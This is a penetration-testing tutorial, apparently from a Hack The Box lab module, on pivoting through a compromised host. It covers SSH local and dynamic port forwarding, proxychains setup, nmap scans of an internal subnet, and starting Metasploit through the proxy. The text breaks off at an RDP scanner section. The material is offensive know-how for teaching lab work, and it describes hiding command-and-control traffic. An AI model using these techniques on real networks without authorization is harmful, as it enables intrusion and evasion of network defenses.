# 🔄 Pivoting, Tunneling, and Port Forwarding

_Once a foothold is secured within the shadowed network, the true journey begins. Pivoting enables passage through the compromised host to unseen realms, while port forwarding and tunneling cloak the traveler’s path in layers of deception, bending the flow of traffic like an eldritch stream._

> _“The deeper you delve, the more the paths twist and the darkness thickens.”_

---

<details>
<summary><h1>📢 Introduction</h1></summary>

**Understanding Pivoting in Network Assessments**

During security assessments—such as red team engagements, penetration tests, or Active Directory assessments—a common scenario arises: you possess the necessary credentials (passwords, SSH keys, hashes, tokens) to access a new target, but that host is not directly reachable from your attack machine.

In these situations, you must use a pivot host—a previously compromised system—to route your traffic and reach the next target.

Upon first accessing a host, it is critical to perform immediate reconnaissance. Key checks include:

- **Privilege Level**: What user permissions do you have?
- **Network Connections**: What other systems is this host communicating with?
- **VPN & Remote Access Software**: Is the host acting as a gateway to other networks?

If a host has multiple network adapters, it is a prime candidate for pivoting to different network segments.

<details>
<summary><h2>Pivoting</h2></summary>

Pivoting is the technique of **using a compromised host to gain access to otherwise unreachable networks**, allowing you to discover and engage with new targets on different network segments.

**Common Terminology for a Pivot Host**

A host used for this purpose is often referred to by several names:

- **Pivot Host**
- **Jump Host**
- **Proxy**
- **Foothold**
- **Beach Head System**

Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network.

**Practical example**

_During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment._

</details>

<details>
<summary><h2>Tunneling</h2></summary>

Tunneling is a technique used to **encapsulate network traffic within another protocol**. This creates a "tunnel" through a compromised host, allowing you to covertly route traffic and bypass network security controls.

**Common Terminology for Tunneling**

This technique is often described using several related terms:

- **Tunneling**
- **Protocol Tunneling**
- **Traffic Encapsulation**
- **Proxying (in certain contexts)**

Tunneling's primary use is to enable stealthy pivoting. It defeats network segmentation and monitoring by disguising malicious traffic as legitimate, allowed protocol communications (such as HTTP, DNS, or ICMP), making it difficult for defenders to detect.

**Practical example**

_One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out._

</details>

<details>
<summary><h2>Lateral Movement</h2></summary>

Lateral Movement is the technique adversaries use to **progressively explore, access, and control additional hosts, applications, and services within a network environment after gaining an initial foothold**.

Common Terminology for Lateral Movement
This phase of an attack is often described using several related terms:

- **Lateral Movement**
- **Horizontal Movement**
- **East-West Movement**

The primary purpose of Lateral Movement is to expand access within a network segment. It is used to find specific targets, access critical domain resources, and escalate privileges across multiple systems to achieve the final objective.

**Practical Example**

_During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further._

</details>

</details>

---

<details>
<summary><h1>🌐 The Networking Behind Pivoting</h1></summary>

Being able to grasp the concept of pivoting well enough to succeed at it on an engagement requires a solid fundamental understanding of some key networking concepts. This section will be a quick refresher on essential foundational networking concepts to understand pivoting.

<details>
<summary><h2>IP Addressing & Network Interface Controllers (NICs)</h2></summary>

**What is an IP Address?**
Every computer communicating on a network requires an IP address. Without one, a host is effectively not on the network. This address is a software-assigned identifier, typically obtained in one of two ways:

- **Dynamically**: Automatically assigned by a DHCP server.

- **Statically**: Manually configured, which is common for critical network infrastructure and services, such as:
  - Servers
  - Routers
  - Switch Virtual Interfaces
  - Printers

**The Role of the Network Interface Controller (NIC)**

The IP address is assigned to a Network Interface Controller (NIC)—also commonly known as a Network Interface Card or Network Adapter.

A single computer can have multiple NICs (both physical and virtual), each with its own IP address. This allows a host to communicate on multiple, separate networks simultaneously.

**Importance for Pivoting**

Identifying pivoting opportunities is directly dependent on understanding the IP addresses of a compromised host. Additional NICs and their associated networks are primary indicators of other, potentially valuable network segments the host can reach.

**Therefore, one of the first commands to run on a newly compromised host is to check its network configuration:**

<details>
<summary><h3>Windows Example</h3></summary>

<table width="100%">
<tr>
<td> ⚡ <b>PowerShell — WS01</b> </td>
</tr>
<tr>
<td>

```powershell
ipconfig /all
```

---

```
Windows IP Configuration

Unknown adapter NordLynx:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::1a9
   IPv6 Address. . . . . . . . . . . : dead:beef::f58b:6381:c648:1fb0
   Temporary IPv6 Address. . . . . . : dead:beef::dd0b:7cda:7118:3373
   Link-local IPv6 Address . . . . . : fe80::f58b:6381:c648:1fb0%8
   IPv4 Address. . . . . . . . . . . : 10.129.221.36
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:df81%8
                                       10.129.0.1

Ethernet adapter Ethernet:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

</td>
</tr>
</table>

**Network interfaces (summary)**

| Interface                    |             Address(es) |                      Mask / Prefix | Role / Notes                                                                                                                                                                           |
| ---------------------------- | ----------------------: | ---------------------------------: | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `NordLynx` (Unknown adapter) |                       — |                                  — | Not connected (media disconnected) — likely a WireGuard/WireGuard-based adapter (NordVPN).                                                                                             |
| `Ethernet0 2`                | IPv4: **10.129.221.36** | Subnet Mask: **255.255.0.0** (/16) | Active interface on HTB lab network (`.htb` DNS suffix). Dual-stack with several IPv6 addresses. Default gateways: IPv6 link-local `fe80::250:56ff:feb9:df81%8` and IPv4 `10.129.0.1`. |
| `Ethernet`                   |                       — |                                  — | Disconnected physical adapter.                                                                                                                                                         |

**Key observations & implications**

- The system is on a private IPv4 network (10.129.0.0/16). This is an RFC1918 address space and is reachable only inside the lab network or via VPN/tunnel, not directly from the public Internet.
- The host uses dual-stack: it has both IPv4 and IPv6 addresses. Services or hosts may be reachable over either protocol; testing should consider both when possible.
- The NordLynx adapter is present but disconnected — if it becomes active it may provide an alternative VPN route (different lab or Internet VPN).
- The subnet mask (255.255.0.0) indicates the host shares the 10.129.0.0/16 network with any 10.129.x.x addresses; traffic to other subnets will be sent to the default gateway (10.129.0.1).
- For pivoting or lateral movement: the networks visible from this host are limited to the subnets reachable via its assigned interfaces (and whatever routes the gateway provides). Documenting the IPs, masks and gateway is essential to know what this host can reach. |

</details>

<details>
<summary><h3>Linux & macOS Example</h3></summary>

<table width="100%">
<tr>
<td> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td>

```bash
ifconfig
```

---

```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 134.122.100.200  netmask 255.255.240.0  broadcast 134.122.111.255
        inet6 fe80::e973:b08d:7bdf:dc67  prefixlen 64  scopeid 0x20<link>
        ether 12:ed:13:35:68:f5  txqueuelen 1000  (Ethernet)
        RX packets 8844  bytes 803773 (784.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5698  bytes 9713896 (9.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.106.0.172  netmask 255.255.240.0  broadcast 10.106.15.255
        inet6 fe80::a5bf:1cd4:9bca:b3ae  prefixlen 64  scopeid 0x20<link>
        ether 4e:c7:60:b0:01:8d  txqueuelen 1000  (Ethernet)
        RX packets 15  bytes 1620 (1.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1858 (1.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 19787  bytes 10346966 (9.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19787  bytes 10346966 (9.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.15.54  netmask 255.255.254.0  destination 10.10.15.54
        inet6 fe80::c85a:5717:5e3a:38de  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::1034  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7  bytes 336 (336.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

</td>
</tr>
</table>

**Network interfaces (summary)**

| Interface |                                  Address(es) |    Netmask / Prefix | Role / Notes                                                   |
| --------- | -------------------------------------------: | ------------------: | -------------------------------------------------------------- |
| `eth0`    |                              134.122.100.200 | 255.255.240.0 (/20) | Public IP — host reachable via Internet / DMZ                  |
| `eth1`    |                                 10.106.0.172 | 255.255.240.0 (/20) | Private/internal network                                       |
| `lo`      |                                    127.0.0.1 |           255.0.0.0 | Local loopback                                                 |
| `tun0`    | 10.10.15.54 (IPv4), dead:beef:2::1034 (IPv6) | 255.255.254.0 (/23) | VPN tunnel interface — indicates an active OpenVPN/HTB tunnel. |

**Key observations & implications**

- The presence of `tun0` confirms an active VPN connection. HTB lab access is provided over such a tunnel: without it, lab networks are unreachable.
- `eth0` has a public IP (routable on the Internet). Public-facing interfaces are typically in DMZs and can be reached from outside, subject to firewall rules.
- `eth1` uses a private address (RFC1918) and is routable only inside the local/internal network. Private addresses are not directly reachable from the Internet.
- NAT is typically used at the network edge to translate between private addresses and a public IP on the appliance that connects to the Internet. Devices without a public IP rely on NAT to communicate externally.
- VPNs encrypt traffic and create a logical tunnel over the public network; this enables access to internal lab resources while protecting traffic in transit.

</details>

</details>

<details>
<summary><h2>Routing</h2></summary>

Routing is the process of forwarding packets based on their destination IP. Although people often picture a specialised “router” appliance, **any host can act as a router** if it forwards traffic between interfaces. In pentesting and pivoting you’ll often need a host (pivot) to route traffic into otherwise unreachable networks. Tools like AutoRoute automate adding routes on your attack box so traffic destined for target subnets is forwarded via a pivot host.

<table width="100%">
<tr>
<td> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td>

```bash
netstat -r
```

---

```
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
default         178.62.64.1     0.0.0.0         UG        0 0          0 eth0
10.10.10.0      10.10.14.1      255.255.254.0   UG        0 0          0 tun0
10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0
10.106.0.0      0.0.0.0         255.255.240.0   U         0 0          0 eth1
10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0
178.62.64.0     0.0.0.0         255.255.192.0   U         0 0          0 eth0
```

</td>
</tr>
</table>

**Routing table fields**

- **Destination** — network (or default) the route matches.
- **Gateway** — next-hop IP to which packets are forwarded.
- **Genmask** — subnet mask (defines the network size).
- **Flags** — route attributes (e.g. U = up, G = uses gateway).
- **Iface** — interface used to send packets (e.g. eth0, tun0).

**How the system decides where to send a packet**

1. When a packet is created, the OS looks up the destination in the routing table.
2. If a specific route matches, the OS forwards the packet to the route’s Gateway via the listed Iface.
3. If no specific route matches, the packet is sent to the default route (aka default gateway / gateway of last resort).
4. Routes can be learned from:
   _ Directly connected interfaces (automatic when an interface is up and has an IP),
   _ Static routes configured by an admin, \* Dynamic routing protocols (OSPF, BGP, etc.) on dedicated routers.

**Pivoting and AutoRoute — practical notes**

- **Pivoting**: to reach a target network from your attack box, the attack box must have a route that forwards traffic to the pivot host which can reach that network.
- **AutoRoute**: common in labs — it installs routes on your attack machine so traffic destined for lab subnets is routed via the pivot automatically.
- **Inspection**: always inspect the host’s routing table to discover which networks are reachable and which additional routes are required for pivoting.

**When to inspect routes during an engagement**

- After gaining code execution on a host (to know what networks that host can reach).
- Before attempting port scans or service connections through a pivot.
- When AutoRoute or proxying fails — confirm the required route exists and points at the pivot.

Short checklist for pivoting

- _Check routing table on the pivot and on your attack box._
- _Confirm the pivot can reach the target network (ping/traceroute from pivot)._
- _Add a route on your attack box that points to the pivot as next-hop for the target subnet._
- _Verify traffic flows (tcpdump / packet captures on pivot or your box)._

</details>

<details>
<summary><h2>Protocols, Services & Ports</h2></summary>

What they are

- **Protocols** — rules that govern how devices communicate over a network (e.g., HTTP, FTP, SSH).
- **Services** — applications that implement protocols (e.g., a web server provides HTTP).
- **Ports** — logical identifiers (numbers) assigned in software to services. Ports are not physical; they let us address an application on a host.

How they relate

- An **IP address** identifies a host on the network.
- An **open port** on that IP identifies a specific application/service we can connect to.
- **Firewalls and network policies** often permit traffic on certain ports (e.g., port 80 for HTTP). Attackers can sometimes abuse those allowed ports to gain a foothold.

Client vs server ports

- The **server** listens on a well-known port (e.g., HTTP → port 80).
- The **client** uses an ephemeral source port to track the connection. Both sides’ ports matter when establishing and maintaining communications.

</details>

</details>

---

<details>
<summary><h1>⛏️ Choosing The Dig Site & Starting Our Tunnels</h1></summary>

<details>
<summary><h2>🔀 Dynamic Port Forwarding with SSH and SOCKS Tunneling</h2></summary>

Port forwarding is a technique that redirects a communication request from one port to another. It typically relies on TCP to maintain interactive communication, but can also use other encapsulation methods — for example, SSH tunnels or SOCKS proxies — to transport the forwarded traffic. This makes it a powerful method for bypassing firewalls and pivoting through compromised hosts to reach internal networks.

<details>
<summary><h3>1. Scanning the Pivot Target</h2></summary>

We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), which we have compromised. We will scan the target Ubuntu server using Nmap to search for open ports.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
nmap -sT -p22,3306 10.129.202.64
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
Nmap scan report for 10.129.202.64
Host is up (0.12s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

</td>
</tr>
</table>

Nmap shows the SSH port on the target is open. MySQL is running on the Ubuntu server and listening on localhost:3306, so it is not directly reachable from your machine. There are two practical options:

**Option A** — SSH in and use MySQL locally (direct, interactive) 1. ssh to the target 2. Connect with the mysql client on the server

- _When to use:_ quick inspection, admin tasks, or when you can run your tooling on the server itself.
- _Pros:_ no port forwarding needed; uses native network context.
- _Cons:_ some exploit tools or GUI clients run only from your local machine, or require a local TCP connection.

**Option B** — Port-forward MySQL to your localhost (recommended for local tooling)

Why this helps:

- MySQL is hosted locally on the Ubuntu server at 3306 (bound to 127.0.0.1), so it is unreachable directly from your host.
- Port forwarding exposes that local socket on your machine (:1234), letting local tools (exploit frameworks, GUI clients, scripts) connect as if the DB were local.
- Many remote exploit workflows require a direct TCP connection to the service — port forwarding makes that possible without changing the server configuration.

</details>

<details>
<summary><h3>2. Executing the Local Port Forward</h2></summary>

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
ubuntu@10.129.202.64's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 24 Feb 2022 05:23:20 PM UTC

  System load:             0.0
  Usage of /:              28.4% of 13.72GB
  Memory usage:            34%
  Swap usage:              0%
  Processes:               175
  Users logged in:         1
  IPv4 address for ens192: 10.129.202.64
  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

66 updates can be applied immediately.
45 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable
```

</td>
</tr>
</table>

By doing this, we should be able to access the MySQL service locally on port 1234.

Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the local port:server:port argument to your ssh command.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>3. Confirming Port Forward</h2></summary>

**Netstat**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
netstat -antp | grep 1234
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh
tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh
```

</td>
</tr>
</table>

**Nmap**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
nmap -v -sV -p1234 localhost
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 12:18
Scanning localhost (127.0.0.1) [2 ports]
Completed Ping Scan at 12:18, 0.01s elapsed (1 total hosts)
Initiating Connect Scan at 12:18
Scanning localhost (127.0.0.1) [1 port]
Discovered open port 1234/tcp on 127.0.0.1
Completed Connect Scan at 12:18, 0.01s elapsed (1 total ports)
Initiating Service scan at 12:18
Scanning 1 service on localhost (127.0.0.1)
Completed Service scan at 12:18, 0.12s elapsed (1 service on 1 host)
NSE: Script scanning 127.0.0.1.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.01s elapsed
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0080s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>4. Setting up to Pivot</h2></summary>

If we type `ifconfig` on the Ubuntu host, you will find that this server has multiple NICs:

- One connected to our attack host (_ens192_)
- One communicating to other hosts within a different network (_ens224_)
- The loopback interface (_lo_).

<table width="100%">
<tr>
<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
</tr>
<tr>
<td width="20%">

**`ubuntu@pivot:~$`**

</td>
<td>

```bash
ifconfig
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)
        RX packets 35571  bytes 177919049 (177.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10452  bytes 1474767 (1.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)
        RX packets 8251  bytes 1125190 (1.1 MB)
        RX errors 0  dropped 40  overruns 0  frame 0
        TX packets 1538  bytes 123584 (123.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 270  bytes 22432 (22.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 270  bytes 22432 (22.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

</td>
</tr>
</table>

When your attack host **has no route** to a target subnet (e.g. `172.16.5.0/23`), but you do have SSH access to a host inside that network (the Ubuntu box), you can pivot your scans and tools through that host using a **SOCKS proxy** created by SSH dynamic port forwarding.

**SOCKS4 vs SOCKS5**

| Feature                  | SOCKS4               | SOCKS5                                     |
| ------------------------ | -------------------- | ------------------------------------------ |
| Authentication           | No                   | Optional (username/password)               |
| TCP support              | Yes                  | Yes                                        |
| UDP support              | No                   | Yes (UDP ASSOCIATE)                        |
| DNS resolution via proxy | No (client resolves) | Yes (can resolve via proxy with `socks5h`) |

> **NOTE:** Use SOCKS5 (`ssh -D` gives SOCKS5) because it supports authentication and UDP, and allows proxy-side DNS resolution when tools request it (use `--socks5-hostname` or `socks5h` where supported).


In the above image, the attack host starts the SSH client and requests the SSH server to allow it to send some TCP data over the ssh socket. The SSH server responds with an acknowledgment, and the SSH client then starts listening on localhost:9050. Whatever data you send here will be broadcasted to the entire network (172.16.5.0/23) over SSH.

<details>
<summary><h3>4.1. Enabling Dynamic Port Forwarding with SSH</h2></summary>

The `-D` argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port **9050**. We can do this using the tool `proxychains`, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's **TCP traffic** to go through hosted proxies like **SOCKS4**/**SOCKS5**, **TOR**, or **HTTP**/**HTTPS** proxies.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ssh -D 9050 ubuntu@10.129.202.64
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>4.2. Checking /etc/proxychains.conf</h2></summary>

To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 9050 to the last line if it is not already there.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
tail -4 /etc/proxychains.conf
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>4.3. Using Nmap with Proxychains</h2></summary>

Now we want to run nmap through that SOCKS proxy using proxychains so scans originate from the pivot host and can reach an otherwise inaccessible subnet (e.g., `172.16.5.0/23`).

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
proxychains nmap -v -sn 172.16.5.1-200
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
Initiating Ping Scan at 12:30
Scanning 10 hosts [2 ports/host]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.2:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.5:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.6:80-<--timeout
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
...
```

</td>
</tr>
</table>

- `proxychains` intercepts nmap’s TCP connections and routes them through the SOCKS proxy at `127.0.0.1:9050`.
- That SOCKS proxy forwards the connections over the SSH tunnel to the pivot host, which then performs the network actions from inside the target network.
- From the target network’s perspective, traffic appears to come from the pivot host IP.

_Only full TCP connect scans (`-sT`) and connect-style operations are reliable._

- proxychains proxies raw TCP streams — it cannot handle partial/raw packets.
- Low-level scans that require raw sockets (e.g., SYN scan `-sS`, many raw ping techniques) will not work correctly through proxychains and will produce false or inconsistent results.

_Host-alive (ping) checks may fail for Windows targets._

- Windows Defender / host firewalls commonly block ICMP echo requests; a ping scan (`-sn`) may show hosts as down even though TCP ports are open.

_Performance will be slower and higher-latency._

- All traffic is proxied and serialized through the SSH tunnel, which increases RTT and may affect timing-sensitive scans. Expect longer run times.

_UDP scanning is unreliable (or impossible) over SOCKS in many tools._

- SOCKS5 supports UDP, but most scanning tools don’t implement UDP-over-SOCKS well. Run UDP scans on the pivot host itself if needed.

</details>

<details>
<summary><h3>4.4. Enumerating the Windows Target through Proxychains</h2></summary>

So, for this module, we will primarily focus on scanning individual hosts, or smaller ranges of hosts we know are alive, which in this case will be a Windows host at `172.16.5.19`.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
proxychains nmap -v -Pn -sT 172.16.5.19
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:33 EST
Initiating Parallel DNS resolution of 1 host. at 12:33
Completed Parallel DNS resolution of 1 host. at 12:33, 0.15s elapsed
Initiating Connect Scan at 12:33
Scanning 172.16.5.19 [1000 ports]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1720-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:587-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:445-<><>-OK
Discovered open port 445/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8080-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:23-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:135-<><>-OK
Discovered open port 135/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:110-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:21-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:554-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-1172.16.5.19:25-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:5900-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1025-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:143-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:199-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:993-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:995-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:443-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:113-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8888-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:139-<><>-OK
Discovered open port 139/tcp on 172.16.5.19
```

</td>
</tr>
</table>

The Nmap scan shows several open ports, one of which is RDP port (3389). Similar to the Nmap scan, we can also pivot msfconsole via proxychains to perform vulnerable RDP scans using Metasploit auxiliary modules.

</details>

</details>
<details>
<summary><h3>5. Using Metasploit with Proxychains</h2></summary>

We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
proxychains msfconsole
ProxyChains-3.1 (http://proxychains.sf.net)
...
Press SPACE BAR to continue

       =[ metasploit v6.1.27-dev                          ]
+ -- --=[ 2196 exploits - 1162 auxiliary - 400 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params
set LHOST eth0

msf6 >
```

</td>
</tr>
</table>

**Using rdp_scanner Module**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
